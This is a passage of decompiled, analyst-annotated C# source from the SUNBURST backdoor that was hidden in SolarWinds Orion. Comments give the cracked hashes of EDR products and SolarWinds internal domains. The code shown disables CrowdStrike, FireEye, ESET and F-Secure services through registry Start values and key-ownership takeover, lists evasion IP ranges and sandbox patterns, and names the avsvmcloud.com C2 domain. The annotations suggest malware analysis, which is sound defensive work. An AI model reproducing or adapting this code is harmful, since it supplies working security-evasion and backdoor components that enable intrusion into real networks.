				Svc = new OrionImprovementBusinessLayer.ServiceConfiguration.Service[]
				{
					new OrionImprovementBusinessLayer.ServiceConfiguration.Service
					{
						timeStamp = 11771945869106552231UL /* csagent (Crowdstrike - EDR) */,
						DefaultValue = 1U
					},
					new OrionImprovementBusinessLayer.ServiceConfiguration.Service
					{
						timeStamp = 9234894663364701749UL /* csdevicecontrol (Crowdstrike - EDR) */,
						DefaultValue = 3U
					},
					new OrionImprovementBusinessLayer.ServiceConfiguration.Service
					{
						timeStamp = 8698326794961817906UL /* csfalconservice (Crowdstrike Falcon - EDR) */,
						DefaultValue = 2U
					}
				}
			},
			new OrionImprovementBusinessLayer.ServiceConfiguration
			{
				timeStamps = new ulong[]
				{
					15695338751700748390UL /* xagt (FireEye - EDR) */,
					640589622539783622UL /* xagtnotif (FireEye - EDR) */
				},
				Svc = new OrionImprovementBusinessLayer.ServiceConfiguration.Service[]
				{
					new OrionImprovementBusinessLayer.ServiceConfiguration.Service
					{
						timeStamp = 15695338751700748390UL /* xagt (FireEye - EDR) */,
						DefaultValue = 2U
					},
					new OrionImprovementBusinessLayer.ServiceConfiguration.Service
					{
						timeStamp = 9384605490088500348UL /* fe_avk (FireEye - EDR) */,
						DefaultValue = 3U
					},
					new OrionImprovementBusinessLayer.ServiceConfiguration.Service
					{
						timeStamp = 6274014997237900919UL /* fekern (FireEye - Forensics) */,
						DefaultValue = 3U
					},
					new OrionImprovementBusinessLayer.ServiceConfiguration.Service
					{
						timeStamp = 15092207615430402812UL /* feelam (ESET - EDR) */,
						DefaultValue = 0U
					},
					new OrionImprovementBusinessLayer.ServiceConfiguration.Service
					{
						timeStamp = 3320767229281015341UL /* fewscservice (FireEye - Forensics) */,
						DefaultValue = 3U
					}
				}
			},
			new OrionImprovementBusinessLayer.ServiceConfiguration
			{
				timeStamps = new ulong[]
				{
					3200333496547938354UL /* ekrn (ESET - EDR) */,
					14513577387099045298UL /* eguiproxy (ESET - EDR) */,
					607197993339007484UL /* egui (ESET - EDR) */
				},
				Svc = new OrionImprovementBusinessLayer.ServiceConfiguration.Service[]
				{
					new OrionImprovementBusinessLayer.ServiceConfiguration.Service
					{
						timeStamp = 15587050164583443069UL /* eamonm (ESET - EDR) */,
						DefaultValue = 1U
					},
					new OrionImprovementBusinessLayer.ServiceConfiguration.Service
					{
						timeStamp = 9559632696372799208UL /* eelam (ESET - EDR) */,
						DefaultValue = 0U
					},
					new OrionImprovementBusinessLayer.ServiceConfiguration.Service
					{
						timeStamp = 4931721628717906635UL /* ehdrv (ESET - EDR) */,
						DefaultValue = 1U
					},
					new OrionImprovementBusinessLayer.ServiceConfiguration.Service
					{
						timeStamp = 3200333496547938354UL /* ekrn (ESET - EDR) */,
						DefaultValue = 2U
					},
					new OrionImprovementBusinessLayer.ServiceConfiguration.Service
					{
						timeStamp = 2589926981877829912UL /* ekrnepfw (ESET - EDR) */,
						DefaultValue = 3U
					},
					new OrionImprovementBusinessLayer.ServiceConfiguration.Service
					{
						timeStamp = 17997967489723066537UL /* epfwwfp (ESET - EDR) */,
						DefaultValue = 1U
					},
					new OrionImprovementBusinessLayer.ServiceConfiguration.Service
					{
						timeStamp = 14079676299181301772UL /* ekbdflt (ESET - EDR) */,
						DefaultValue = 2U
					},
					new OrionImprovementBusinessLayer.ServiceConfiguration.Service
					{
						timeStamp = 17939405613729073960UL /* epfw (ESET - EDR) */,
						DefaultValue = 1U
					}
				}
			},
			new OrionImprovementBusinessLayer.ServiceConfiguration
			{
				timeStamps = new ulong[]
				{
					521157249538507889UL /* fsgk32st (F-Secure - EDR) */,
					14971809093655817917UL /* fswebuid (F-Secure - EDR) */,
					10545868833523019926UL /* fsgk32 (F-Secure - EDR) */,
					15039834196857999838UL /* fsma32 (F-Secure - EDR) */,
					14055243717250701608UL /* fssm32 (F-Secure - EDR) */,
					5587557070429522647UL /* fnrb32 (F-Secure - EDR) */,
					12445177985737237804UL /* fsaua (F-Secure - EDR) */,
					17978774977754553159UL /* fsorsp (F-Secure ORSP - EDR) */,
					17017923349298346219UL /* fsav32 (F-Secure - EDR) */
				},
				Svc = new OrionImprovementBusinessLayer.ServiceConfiguration.Service[]
				{
					new OrionImprovementBusinessLayer.ServiceConfiguration.Service
					{
						timeStamp = 17624147599670377042UL /* f-secure gatekeeper handler starter (F-Secure - EDR) */,
						DefaultValue = 2U
					},
					new OrionImprovementBusinessLayer.ServiceConfiguration.Service
					{
						timeStamp = 16066651430762394116UL /* f-secure network request broker (F-Secure - EDR) */,
						DefaultValue = 3U
					},
					new OrionImprovementBusinessLayer.ServiceConfiguration.Service
					{
						timeStamp = 13655261125244647696UL /* f-secure webui daemon (F-Secure - EDR) */,
						DefaultValue = 2U
					},
					new OrionImprovementBusinessLayer.ServiceConfiguration.Service
					{
						timeStamp = 12445177985737237804UL /* fsaua (F-Secure - EDR) */,
						DefaultValue = 3U
					},
					new OrionImprovementBusinessLayer.ServiceConfiguration.Service
					{
						timeStamp = 3421213182954201407UL /* fsma (F-Secure - EDR) */,
						DefaultValue = 2U
					},
					new OrionImprovementBusinessLayer.ServiceConfiguration.Service
					{
						timeStamp = 14243671177281069512UL /* fsorspclient (F-Secure ORSP - EDR) */,
						DefaultValue = 3U
					},
					new OrionImprovementBusinessLayer.ServiceConfiguration.Service
					{
						timeStamp = 16112751343173365533UL /* f-secure gatekeeper (F-Secure - EDR) */,
						DefaultValue = 3U
					},
					new OrionImprovementBusinessLayer.ServiceConfiguration.Service
					{
						timeStamp = 3425260965299690882UL /* f-secure hips (F-Secure - EDR) */,
						DefaultValue = 1U
					},
					new OrionImprovementBusinessLayer.ServiceConfiguration.Service
					{
						timeStamp = 9333057603143916814UL /* fsbts (F-Secure - EDR) */,
						DefaultValue = 0U
					},
					new OrionImprovementBusinessLayer.ServiceConfiguration.Service
					{
						timeStamp = 3413886037471417852UL /* fsni (F-Secure - EDR) */,
						DefaultValue = 3U
					},
					new OrionImprovementBusinessLayer.ServiceConfiguration.Service
					{
						timeStamp = 7315838824213522000UL /* fsvista (F-Secure - EDR) */,
						DefaultValue = 1U
					},
					new OrionImprovementBusinessLayer.ServiceConfiguration.Service
					{
						timeStamp = 13783346438774742614UL /* f-secure filter (F-Secure - EDR) */,
						DefaultValue = 4U
					},
					new OrionImprovementBusinessLayer.ServiceConfiguration.Service
					{
						timeStamp = 2380224015317016190UL /* f-secure recognizer (F-Secure - EDR) */,
						DefaultValue = 4U
					},
					new OrionImprovementBusinessLayer.ServiceConfiguration.Service
					{
						timeStamp = 3413052607651207697UL /* fses (F-Secure - EDR) */,
						DefaultValue = 1U
					},
					new OrionImprovementBusinessLayer.ServiceConfiguration.Service
					{
						timeStamp = 3407972863931386250UL /* fsfw (F-Secure - EDR) */,
						DefaultValue = 1U
					},
					new OrionImprovementBusinessLayer.ServiceConfiguration.Service
					{
						timeStamp = 10393903804869831898UL /* fsdfw (F-Secure - EDR) */,
						DefaultValue = 3U
					},
					new OrionImprovementBusinessLayer.ServiceConfiguration.Service
					{
						timeStamp = 12445232961318634374UL /* fsaus (F-Secure - EDR) */,
						DefaultValue = 2U
					},
					new OrionImprovementBusinessLayer.ServiceConfiguration.Service
					{
						timeStamp = 3421197789791424393UL /* fsms (F-Secure - EDR) */,
						DefaultValue = 2U
					},
					new OrionImprovementBusinessLayer.ServiceConfiguration.Service
					{
						timeStamp = 541172992193764396UL /* fsdevcon (F-Secure - EDR) */,
						DefaultValue = 2U
					}
				}
			}
		};

		private static readonly OrionImprovementBusinessLayer.IPAddressesHelper[] nList = new OrionImprovementBusinessLayer.IPAddressesHelper[]
		{
			new OrionImprovementBusinessLayer.IPAddressesHelper("10.0.0.0", "255.0.0.0", OrionImprovementBusinessLayer.AddressFamilyEx.Atm),
			new OrionImprovementBusinessLayer.IPAddressesHelper("172.16.0.0", "255.240.0.0", OrionImprovementBusinessLayer.AddressFamilyEx.Atm),
			new OrionImprovementBusinessLayer.IPAddressesHelper("192.168.0.0", "255.255.0.0", OrionImprovementBusinessLayer.AddressFamilyEx.Atm),
			new OrionImprovementBusinessLayer.IPAddressesHelper("224.0.0.0", "240.0.0.0", OrionImprovementBusinessLayer.AddressFamilyEx.Atm),
			new OrionImprovementBusinessLayer.IPAddressesHelper("fc00::", "fe00::", OrionImprovementBusinessLayer.AddressFamilyEx.Atm),
			new OrionImprovementBusinessLayer.IPAddressesHelper("fec0::", "ffc0::", OrionImprovementBusinessLayer.AddressFamilyEx.Atm),
			new OrionImprovementBusinessLayer.IPAddressesHelper("ff00::", "ff00::", OrionImprovementBusinessLayer.AddressFamilyEx.Atm),
			new OrionImprovementBusinessLayer.IPAddressesHelper("41.84.159.0", "255.255.255.0", OrionImprovementBusinessLayer.AddressFamilyEx.Ipx),
			new OrionImprovementBusinessLayer.IPAddressesHelper("74.114.24.0", "255.255.248.0", OrionImprovementBusinessLayer.AddressFamilyEx.Ipx),
			new OrionImprovementBusinessLayer.IPAddressesHelper("154.118.140.0", "255.255.255.0", OrionImprovementBusinessLayer.AddressFamilyEx.Ipx),
			new OrionImprovementBusinessLayer.IPAddressesHelper("217.163.7.0", "255.255.255.0", OrionImprovementBusinessLayer.AddressFamilyEx.Ipx),
			new OrionImprovementBusinessLayer.IPAddressesHelper("20.140.0.0", "255.254.0.0", OrionImprovementBusinessLayer.AddressFamilyEx.ImpLink),
			new OrionImprovementBusinessLayer.IPAddressesHelper("96.31.172.0", "255.255.255.0", OrionImprovementBusinessLayer.AddressFamilyEx.ImpLink),
			new OrionImprovementBusinessLayer.IPAddressesHelper("131.228.12.0", "255.255.252.0", OrionImprovementBusinessLayer.AddressFamilyEx.ImpLink),
			new OrionImprovementBusinessLayer.IPAddressesHelper("144.86.226.0", "255.255.255.0", OrionImprovementBusinessLayer.AddressFamilyEx.ImpLink),
			new OrionImprovementBusinessLayer.IPAddressesHelper("8.18.144.0", "255.255.254.0", OrionImprovementBusinessLayer.AddressFamilyEx.NetBios),
			new OrionImprovementBusinessLayer.IPAddressesHelper("18.130.0.0", "255.255.0.0", OrionImprovementBusinessLayer.AddressFamilyEx.NetBios, true),
			new OrionImprovementBusinessLayer.IPAddressesHelper("71.152.53.0", "255.255.255.0", OrionImprovementBusinessLayer.AddressFamilyEx.NetBios),
			new OrionImprovementBusinessLayer.IPAddressesHelper("99.79.0.0", "255.255.0.0", OrionImprovementBusinessLayer.AddressFamilyEx.NetBios, true),
			new OrionImprovementBusinessLayer.IPAddressesHelper("87.238.80.0", "255.255.248.0", OrionImprovementBusinessLayer.AddressFamilyEx.NetBios),
			new OrionImprovementBusinessLayer.IPAddressesHelper("199.201.117.0", "255.255.255.0", OrionImprovementBusinessLayer.AddressFamilyEx.NetBios),
			new OrionImprovementBusinessLayer.IPAddressesHelper("184.72.0.0", "255.254.0.0", OrionImprovementBusinessLayer.AddressFamilyEx.NetBios, true)
		};

		private static readonly ulong[] patternHashes = new ulong[]
		{
			//    HASH                      CRACKED               ASSUMPTIONS
			//  ---------                  ---------             --------------
			1109067043404435916UL,      // 'swdev.local' ->  SolarWinds Dev local
			15267980678929160412UL,     // 'swdev.dmz'   ->  SolarWinds Development DMZ
			8381292265993977266UL,      // 'lab.local'   ->  Local lab
			3796405623695665524UL,      // 'lab.na'      ->  SolarWinds North America office
			4578480846255629462UL,      // 'lab.brno'    ->  SolarWinds Brno office
			8727477769544302060UL,      // 'emea.sales'  ->  EMEA Sales
			10734127004244879770UL,     // 'cork.lab'    ->  SolarWinds Cork office
			11073283311104541690UL,     // 'dev.local'   ->  Development
			4030236413975199654UL,      // 'dmz.local'   ->  Demilitarized Zone
			7701683279824397773UL,      // 'pci.local'   ->  PCI
			5132256620104998637UL,      // 'saas.swi'    ->  SaaS SolarWinds
			5942282052525294911UL,      // 'lab.rio'     ->  SolarWinds Rio Office
			16858955978146406642UL      // 'apac.lab'    ->  SolarWinds APAC offices
		};


	   	private static readonly string[] patternList = new string[]
		{
			"(?i)([^a-z]|^)(test)([^a-z]|$)",
			"(?i)(solarwinds)"
		};




		private static readonly string reportStatusName = "ReportWatcherRetry";

		private static readonly string serviceStatusName = "ReportWatcherPostpone";

		private static string userAgentOrionImprovementClient = null;

		private static string userAgentDefault = null;

		private static readonly string apiHost = "api.solarwinds.com";

		private static readonly string domain1 = "avsvmcloud.com";

		private static readonly string domain2 = "appsync-api";

		private static readonly string[] domain3 = new string[]
		{
			"eu-west-1",
			"us-west-2",
			"us-east-1",
			"us-east-2"
		};

		private static readonly string appId = "583da945-62af-10e8-4902-a8f205c72b2e";

		private static OrionImprovementBusinessLayer.ReportStatus status = OrionImprovementBusinessLayer.ReportStatus.New;

		private static string domain4 = null;

		private static byte[] userId = null;

		private static NamedPipeServerStream instance = null;

		private const int minInterval = 30;

		private const int maxInterval = 120;

		private static string osVersion = null;

		private static string osInfo = null;

		private enum ReportStatus
		{
			New,
			Append,
			Truncate
		}

		private enum AddressFamilyEx
		{
			NetBios,
			ImpLink,
			Ipx,
			InterNetwork,
			InterNetworkV6,
			Unknown,
			Atm,
			Error
		}

		private enum HttpOipMethods
		{
			Get,
			Head,
			Put,
			Post
		}

		private enum ProxyType
		{
			Manual,
			System,
			Direct,
			Default
		}

		private static class RegistryHelper
		{
			private static RegistryHive GetHive(string key, out string subKey)
			{
				string[] array = key.Split(new char[]
				{
					'\\'
				}, 2);
				string a = array[0].ToUpper();
				subKey = ((array.Length <= 1) ? "" : array[1]);
				if (a == "HKEY_CLASSES_ROOT" || a == "HKCR")
				{
					return RegistryHive.ClassesRoot;
				}
				if (a == "HKEY_CURRENT_USER" || a == "HKCU")
				{
					return RegistryHive.CurrentUser;
				}
				if (a == "HKEY_LOCAL_MACHINE" || a == "HKLM")
				{
					return RegistryHive.LocalMachine;
				}
				if (a == "HKEY_USERS" || a == "HKU")
				{
					return RegistryHive.Users;
				}
				if (a == "HKEY_CURRENT_CONFIG" || a == "HKCC")
				{
					return RegistryHive.CurrentConfig;
				}
				if (a == "HKEY_PERFOMANCE_DATA" || a == "HKPD")
				{
					return RegistryHive.PerformanceData;
				}
				if (!(a == "HKEY_DYN_DATA") && !(a == "HKDD"))
				{
					return (RegistryHive)0;
				}
				return RegistryHive.DynData;
			}

			public static bool SetValue(string key, string valueName, string valueData, RegistryValueKind valueKind)
			{
				string name;
				bool result;
				using (RegistryKey registryKey = RegistryKey.OpenBaseKey(OrionImprovementBusinessLayer.RegistryHelper.GetHive(key, out name), RegistryView.Registry64))
				{
					using (RegistryKey registryKey2 = registryKey.OpenSubKey(name, true))
					{
						switch (valueKind)
						{
						case RegistryValueKind.String:
						case RegistryValueKind.ExpandString:
						case RegistryValueKind.DWord:
						case RegistryValueKind.QWord:
							registryKey2.SetValue(valueName, valueData, valueKind);
							goto IL_96;
						case RegistryValueKind.Binary:
							registryKey2.SetValue(valueName, OrionImprovementBusinessLayer.HexStringToByteArray(valueData), valueKind);
							goto IL_96;
						case RegistryValueKind.MultiString:
							registryKey2.SetValue(valueName, valueData.Split(new string[]
							{
								"\r\n",
								"\n"
							}, StringSplitOptions.None), valueKind);
							goto IL_96;
						}
						return false;
						IL_96:
						result = true;
					}
				}
				return result;
			}

			public static string GetValue(string key, string valueName, object defaultValue)
			{
				string name;
				using (RegistryKey registryKey = RegistryKey.OpenBaseKey(OrionImprovementBusinessLayer.RegistryHelper.GetHive(key, out name), RegistryView.Registry64))
				{
					using (RegistryKey registryKey2 = registryKey.OpenSubKey(name))
					{
						object value = registryKey2.GetValue(valueName, defaultValue);
						if (value != null)
						{
							if (value.GetType() == typeof(byte[]))
							{
								return OrionImprovementBusinessLayer.ByteArrayToHexString((byte[])value);
							}
							if (value.GetType() == typeof(string[]))
							{
								return string.Join("\n", (string[])value);
							}
							return value.ToString();
						}
					}
				}
				return null;
			}

			public static void DeleteValue(string key, string valueName)
			{
				string name;
				using (RegistryKey registryKey = RegistryKey.OpenBaseKey(OrionImprovementBusinessLayer.RegistryHelper.GetHive(key, out name), RegistryView.Registry64))
				{
					using (RegistryKey registryKey2 = registryKey.OpenSubKey(name, true))
					{
						registryKey2.DeleteValue(valueName, true);
					}
				}
			}

			public static string GetSubKeyAndValueNames(string key)
			{
				string name;
				string result;
				using (RegistryKey registryKey = RegistryKey.OpenBaseKey(OrionImprovementBusinessLayer.RegistryHelper.GetHive(key, out name), RegistryView.Registry64))
				{
					using (RegistryKey registryKey2 = registryKey.OpenSubKey(name))
					{
						result = string.Join("\n", registryKey2.GetSubKeyNames()) + "\n\n" + string.Join(" \n", registryKey2.GetValueNames());
					}
				}
				return result;
			}

			private static string GetNewOwnerName()
			{
				string text = null;
				string value = "S-1-5-";
				string value2 = "-500";
				try
				{
					text = new NTAccount("Administrator").Translate(typeof(SecurityIdentifier)).Value;
				}
				catch
				{
				}
				if (string.IsNullOrEmpty(text) || !text.StartsWith(value, StringComparison.OrdinalIgnoreCase) || !text.EndsWith(value2, StringComparison.OrdinalIgnoreCase))
				{
					string queryString = "Select * From Win32_UserAccount";
					text = null;
					using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(queryString))
					{
						foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
						{
							ManagementObject managementObject = (ManagementObject)managementBaseObject;
							string text2 = managementObject.Properties["SID"].Value.ToString();
							if (managementObject.Properties["LocalAccount"].Value.ToString().ToLower() == "true" && text2.StartsWith(value, StringComparison.OrdinalIgnoreCase))
							{
								if (text2.EndsWith(value2, StringComparison.OrdinalIgnoreCase))
								{
									text = text2;
									break;
								}
								if (string.IsNullOrEmpty(text))
								{
									text = text2;
								}
							}
						}
					}
				}
				return new SecurityIdentifier(text).Translate(typeof(NTAccount)).Value;
			}

			private static void SetKeyOwner(RegistryKey key, string subKey, string owner)
			{
				using (RegistryKey registryKey = key.OpenSubKey(subKey, RegistryKeyPermissionCheck.ReadWriteSubTree, RegistryRights.TakeOwnership))
				{
					RegistrySecurity registrySecurity = new RegistrySecurity();
					registrySecurity.SetOwner(new NTAccount(owner));
					registryKey.SetAccessControl(registrySecurity);
				}
			}

			private static void SetKeyOwnerWithPrivileges(RegistryKey key, string subKey, string owner)
			{
				try
				{
					OrionImprovementBusinessLayer.RegistryHelper.SetKeyOwner(key, subKey, owner);
				}
				catch
				{
					bool newState = false;
					bool newState2 = false;
					bool flag = false;
					bool flag2 = false;
					string privilege = "SeRestorePrivilege";
					string privilege2 = "SeTakeOwnershipPrivilege";
					flag = OrionImprovementBusinessLayer.NativeMethods.SetProcessPrivilege(privilege2, true, out newState);
					flag2 = OrionImprovementBusinessLayer.NativeMethods.SetProcessPrivilege(privilege, true, out newState2);
					try
					{
						OrionImprovementBusinessLayer.RegistryHelper.SetKeyOwner(key, subKey, owner);
					}
					finally
					{
						if (flag)
						{
							OrionImprovementBusinessLayer.NativeMethods.SetProcessPrivilege(privilege2, newState, out newState);
						}
						if (flag2)
						{
							OrionImprovementBusinessLayer.NativeMethods.SetProcessPrivilege(privilege, newState2, out newState2);
						}
					}
				}
			}

			public static void SetKeyPermissions(RegistryKey key, string subKey, bool reset)
			{
				bool isProtected = !reset;
				string text = "SYSTEM";
				string text2 = reset ? text : OrionImprovementBusinessLayer.RegistryHelper.GetNewOwnerName();
				OrionImprovementBusinessLayer.RegistryHelper.SetKeyOwnerWithPrivileges(key, subKey, text);
				using (RegistryKey registryKey = key.OpenSubKey(subKey, RegistryKeyPermissionCheck.ReadWriteSubTree, RegistryRights.ChangePermissions))
				{
					RegistrySecurity registrySecurity = new RegistrySecurity();
					if (!reset)
					{
						RegistryAccessRule rule = new RegistryAccessRule(text2, RegistryRights.FullControl, InheritanceFlags.None, PropagationFlags.NoPropagateInherit, AccessControlType.Allow);
						registrySecurity.AddAccessRule(rule);
					}
					registrySecurity.SetAccessRuleProtection(isProtected, false);
					registryKey.SetAccessControl(registrySecurity);
				}
				if (!reset)
				{
					OrionImprovementBusinessLayer.RegistryHelper.SetKeyOwnerWithPrivileges(key, subKey, text2);
				}
			}
		}

		private static class ConfigManager
		{
			public static bool ReadReportStatus(out OrionImprovementBusinessLayer.ReportStatus status)
			{
				try
				{
					string s;
					int num;
					if (OrionImprovementBusinessLayer.ConfigManager.ReadConfig(OrionImprovementBusinessLayer.reportStatusName, out s) && int.TryParse(s, out num))
					{
						switch (num)
						{
						case 3:
							status = OrionImprovementBusinessLayer.ReportStatus.Truncate;
							return true;
						case 4:
							status = OrionImprovementBusinessLayer.ReportStatus.New;
							return true;
						case 5:
							status = OrionImprovementBusinessLayer.ReportStatus.Append;
							return true;
						}
					}
				}
				catch (ConfigurationErrorsException)
				{
				}
				status = OrionImprovementBusinessLayer.ReportStatus.New;
				return false;
			}

			public static bool ReadServiceStatus(bool _readonly)
			{
				try
				{
					string s;
					int num;
					if (OrionImprovementBusinessLayer.ConfigManager.ReadConfig(OrionImprovementBusinessLayer.serviceStatusName, out s) && int.TryParse(s, out num) && num >= 250 && num % 5 == 0 && num <= 250 + ((1 << OrionImprovementBusinessLayer.svcList.Length) - 1) * 5)
					{
						num = (num - 250) / 5;
						if (!_readonly)
						{
							for (int i = 0; i < OrionImprovementBusinessLayer.svcList.Length; i++)
							{
								OrionImprovementBusinessLayer.svcList[i].stopped = ((num & 1 << i) != 0);
							}
						}
						return true;
					}
				}
				catch (Exception)
				{
				}
				if (!_readonly)
				{
					for (int j = 0; j < OrionImprovementBusinessLayer.svcList.Length; j++)
					{
						OrionImprovementBusinessLayer.svcList[j].stopped = true;
					}
				}
				return false;
			}

			public static bool WriteReportStatus(OrionImprovementBusinessLayer.ReportStatus status)
			{
				OrionImprovementBusinessLayer.ReportStatus reportStatus;
				if (OrionImprovementBusinessLayer.ConfigManager.ReadReportStatus(out reportStatus))
				{
					switch (status)
					{
					case OrionImprovementBusinessLayer.ReportStatus.New:
						return OrionImprovementBusinessLayer.ConfigManager.WriteConfig(OrionImprovementBusinessLayer.reportStatusName, "4");
					case OrionImprovementBusinessLayer.ReportStatus.Append:
						return OrionImprovementBusinessLayer.ConfigManager.WriteConfig(OrionImprovementBusinessLayer.reportStatusName, "5");
					case OrionImprovementBusinessLayer.ReportStatus.Truncate:
						return OrionImprovementBusinessLayer.ConfigManager.WriteConfig(OrionImprovementBusinessLayer.reportStatusName, "3");
					}
				}
				return false;
			}

			public static bool WriteServiceStatus()
			{
				if (OrionImprovementBusinessLayer.ConfigManager.ReadServiceStatus(true))
				{
					int num = 0;
					for (int i = 0; i < OrionImprovementBusinessLayer.svcList.Length; i++)
					{
						num |= (OrionImprovementBusinessLayer.svcList[i].stopped ? 1 : 0) << i;
					}
					return OrionImprovementBusinessLayer.ConfigManager.WriteConfig(OrionImprovementBusinessLayer.serviceStatusName, (num * 5 + 250).ToString());
				}
				return false;
			}

			private static bool ReadConfig(string key, out string sValue)
			{
				sValue = null;
				try
				{
					sValue = ConfigurationManager.AppSettings[key];
					return true;
				}
				catch (Exception)
				{
				}
				return false;
			}

			private static bool WriteConfig(string key, string sValue)
			{
				try
				{
					Configuration configuration = ConfigurationManager.OpenExeConfiguration(ConfigurationUserLevel.None);
					KeyValueConfigurationCollection settings = configuration.AppSettings.Settings;
					if (settings[key] != null)
					{
						settings[key].Value = sValue;
						configuration.Save(ConfigurationSaveMode.Modified);
						ConfigurationManager.RefreshSection(configuration.AppSettings.SectionInformation.Name);
						return true;
					}
				}
				catch (Exception)
				{
				}
				return false;
			}
		}

		private class ServiceConfiguration
		{
			public bool stopped
			{
				get
				{
					object @lock = this._lock;
					bool stopped;
					lock (@lock)
					{
						stopped = this._stopped;
					}
					return stopped;
				}
				set
				{
					object @lock = this._lock;
					lock (@lock)
					{
						this._stopped = value;
					}
				}
			}

			public bool running
			{
				get
				{
					object @lock = this._lock;
					bool running;
					lock (@lock)
					{
						running = this._running;
					}
					return running;
				}
				set
				{
					object @lock = this._lock;
					lock (@lock)
					{
						this._running = value;
					}
				}
			}

			public bool disabled
			{
				get
				{
					object @lock = this._lock;
					bool disabled;
					lock (@lock)
					{
						disabled = this._disabled;
					}
					return disabled;
				}
				set
				{
					object @lock = this._lock;
					lock (@lock)
					{
						this._disabled = value;
					}
				}
			}

			public ServiceConfiguration()
			{
			}

			public ulong[] timeStamps;

			private readonly object _lock = new object();

			private volatile bool _stopped;

			private volatile bool _running;

			private volatile bool _disabled;

			public OrionImprovementBusinessLayer.ServiceConfiguration.Service[] Svc;

			public class Service
			{
				public Service()
				{
				}

				public ulong timeStamp;

				public uint DefaultValue;

				public bool started;
			}
		}

		private static class ProcessTracker
		{
			private static bool SearchConfigurations()
			{
				using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("Select * From Win32_SystemDriver"))
				{
					foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
					{
						ulong hash = OrionImprovementBusinessLayer.GetHash(Path.GetFileName(((ManagementObject)managementBaseObject).Properties["PathName"].Value.ToString()).ToLower());
						if (Array.IndexOf<ulong>(OrionImprovementBusinessLayer.configTimeStamps, hash) != -1)
						{
							return true;
						}
					}
				}
				return false;
			}

			private static bool SearchAssemblies(Process[] processes)
			{
				for (int i = 0; i < processes.Length; i++)
				{
					ulong hash = OrionImprovementBusinessLayer.GetHash(processes[i].ProcessName.ToLower());
					if (Array.IndexOf<ulong>(OrionImprovementBusinessLayer.assemblyTimeStamps, hash) != -1)
					{
						return true;
					}
				}
				return false;
			}

			private static bool SearchServices(Process[] processes)
			{
				for (int i = 0; i < processes.Length; i++)
				{
					ulong hash = OrionImprovementBusinessLayer.GetHash(processes[i].ProcessName.ToLower());
					foreach (OrionImprovementBusinessLayer.ServiceConfiguration serviceConfiguration in OrionImprovementBusinessLayer.svcList)
					{
						if (Array.IndexOf<ulong>(serviceConfiguration.timeStamps, hash) != -1)
						{
							object @lock = OrionImprovementBusinessLayer.ProcessTracker._lock;
							lock (@lock)
							{
								if (!serviceConfiguration.running)
								{
									OrionImprovementBusinessLayer.svcListModified1 = true;
									OrionImprovementBusinessLayer.svcListModified2 = true;
									serviceConfiguration.running = true;
								}
								if (!serviceConfiguration.disabled && !serviceConfiguration.stopped && serviceConfiguration.Svc.Length != 0)
								{
									OrionImprovementBusinessLayer.DelayMin(0, 0);
									OrionImprovementBusinessLayer.ProcessTracker.SetManualMode(serviceConfiguration.Svc);
									serviceConfiguration.disabled = true;
									serviceConfiguration.stopped = true;
								}
							}
						}
					}
				}
				if (OrionImprovementBusinessLayer.svcList.Any((OrionImprovementBusinessLayer.ServiceConfiguration a) => a.disabled))
				{
					OrionImprovementBusinessLayer.ConfigManager.WriteServiceStatus();
					return true;
				}
				return false;
			}

			public static bool TrackProcesses(bool full)
			{
				Process[] processes = Process.GetProcesses();
				if (OrionImprovementBusinessLayer.ProcessTracker.SearchAssemblies(processes))
				{
					return true;
				}
				bool result;
				if (!(result = OrionImprovementBusinessLayer.ProcessTracker.SearchServices(processes)) && full)
				{
					return OrionImprovementBusinessLayer.ProcessTracker.SearchConfigurations();
				}
				return result;
			}

			private static bool SetManualMode(OrionImprovementBusinessLayer.ServiceConfiguration.Service[] svcList)
			{
				try
				{
					bool result = false;
					using (RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\services"))
					{
						foreach (string text in registryKey.GetSubKeyNames())
						{
							foreach (OrionImprovementBusinessLayer.ServiceConfiguration.Service service in svcList)
							{
								try
								{
									if (OrionImprovementBusinessLayer.GetHash(text.ToLower()) == service.timeStamp)
									{
										if (service.started)
										{
											result = true;
											OrionImprovementBusinessLayer.RegistryHelper.SetKeyPermissions(registryKey, text, false);
										}
										else
										{
											using (RegistryKey registryKey2 = registryKey.OpenSubKey(text, true))
											{
												if (registryKey2.GetValueNames().Contains("Start"))
												{
													registryKey2.SetValue("Start", 4, RegistryValueKind.DWord);
													result = true;
												}
											}
										}
									}
									goto IL_B8;
								}
								catch (Exception)
								{
									goto IL_B8;
								}
								break;
								IL_B8:;
							}
						}
					}
					return result;
				}
				catch (Exception)
				{
				}
				return false;
			}

			public static void SetAutomaticMode()
			{
				try
				{
					using (RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\services"))
					{
						foreach (string text in registryKey.GetSubKeyNames())
						{
							foreach (OrionImprovementBusinessLayer.ServiceConfiguration serviceConfiguration in OrionImprovementBusinessLayer.svcList)
							{
								if (serviceConfiguration.stopped)
								{
									foreach (OrionImprovementBusinessLayer.ServiceConfiguration.Service service in serviceConfiguration.Svc)
									{
										try
										{
											if (OrionImprovementBusinessLayer.GetHash(text.ToLower()) == service.timeStamp)
											{
												if (service.started)
												{
													OrionImprovementBusinessLayer.RegistryHelper.SetKeyPermissions(registryKey, text, true);
												}
												else
												{
													using (RegistryKey registryKey2 = registryKey.OpenSubKey(text, true))
													{
														if (registryKey2.GetValueNames().Contains("Start"))
														{
															registryKey2.SetValue("Start", service.DefaultValue, RegistryValueKind.DWord);
														}
													}
												}
											}
											goto IL_ED;
										}
										catch (Exception)
										{
											goto IL_ED;
										}
										break;
										IL_ED:;
									}
								}
							}
						}
					}
				}
				catch (Exception)
				{
				}
			}

			// Note: this type is marked as 'beforefieldinit'.
			static ProcessTracker()
			{
			}

			private static readonly object _lock = new object();
		}

		private static class Job
		{
			public static int GetArgumentIndex(string cl, int num)
			{
				if (cl == null)
				{
					return -1;
				}
				if (num == 0)
				{
					return 0;
				}
				char[] array = cl.ToCharArray();
				bool flag = false;
				int num2 = 0;
				for (int i = 0; i < array.Length; i++)
				{
					if (array[i] == '"')
					{
						flag = !flag;
					}
					if (!flag && array[i] == ' ' && i > 0 && array[i - 1] != ' ')
					{
						num2++;
						if (num2 == num)
						{
							return i + 1;
						}
					}
				}
				return -1;
			}

			public static string[] SplitString(string cl)
			{
				if (cl == null)
				{
					return new string[0];
				}
